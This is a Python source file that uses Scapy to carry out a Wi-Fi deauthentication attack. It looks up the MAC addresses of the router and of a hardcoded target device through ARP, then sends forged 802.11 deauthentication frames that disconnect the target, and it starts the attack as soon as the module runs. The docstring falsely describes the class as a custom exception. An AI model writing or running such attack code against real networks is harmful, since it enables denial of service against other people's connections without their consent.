from scapy.all import RadioTap,Dot11,Dot11Deauth,ARP,sr1,ifaces,send,Raw
import binascii
import scapy.all as scapy 
class morted_user():
    """
    The `morted_user` class is a custom exception class that extends the built-in `Exception` class. It provides methods for network management and security-related tasks.
    
    Methods:
        disconnect_user(mac_address, access_point, interface):
            Creates a deauthentication packet using the provided MAC addresses and sends it to the specified interface.
    
        get_mac_address(ip_address):
            Uses ARP (Address Resolution Protocol) to get the MAC address associated with a given IP address.
    
        getting_ip_of_access_point():
            Retrieves the IP address of the default gateway, which is typically the IP address of the access point (router) in a network.
    
        getting_ip_of_this_device():
            Retrieves the IP address of the device running the code.
    
        getting_interface(ipaddress):
            Retrieves the name and MAC address of the network interface with the specified IP address.
    
        Avadakedabra(devce_ip):
            Retrieves the IP address of the default gateway and the IP address of the device running the code. It then retrieves the MAC addresses associated with these IP addresses and uses the `disconnect_user` method to deauthenticate the device.
    """
    @staticmethod
    def disconnect_user(mac_address, access_point,interface): 
        packet = RadioTap() / Dot11(addr1=mac_address,  
                                    addr2=access_point,  
                addr3=access_point) / Dot11Deauth(reason = 7) 
        x=send(packet, inter=0.01,  
            iface=interface,  
            verbose=1)
        
    
    @staticmethod
    def get_mac_address(ip_address): 
        arp_request = ARP(pdst=ip_address) 
        arp_response = sr1(arp_request,  
                        timeout=1, verbose=False) 
        if arp_response is not None: 
            return arp_response.hwsrc 
        else: 
            return None
    @staticmethod   
    def getting_ip_of_access_point(): 
        return scapy.conf.route.route("8.8.8.8")[2] 
    @staticmethod
    def getting_ip_of_this_device(): 
        return scapy.conf.route.route("8.8.8.8")[1] 
    
    @staticmethod
    def getting_interface(ipaddress): 
        for interface in ifaces.values(): 
            if interface.ip == ipaddress: 
                return {"name": interface.name, "mac": interface.mac} 

    @staticmethod
    def Avadakedabra():
        devce_ip = '192.168.241.248'
        router_ip = morted_user.getting_ip_of_access_point() 
        interface = morted_user.getting_interface(morted_user.getting_ip_of_this_device()) 
        mac_address_access_point = morted_user.get_mac_address(router_ip) 
        mac_address_device = morted_user.get_mac_address(devce_ip) 

        print("MAC Address of Access Point : ", mac_address_access_point) 
        print("MAC Address of Device : ", mac_address_device) 
        print("Starting Deauthentication Attack on Device : ", mac_address_device) 
        morted_user.disconnect_user(mac_address_device, mac_address_access_point, interface['name'])


morted_user.Avadakedabra()
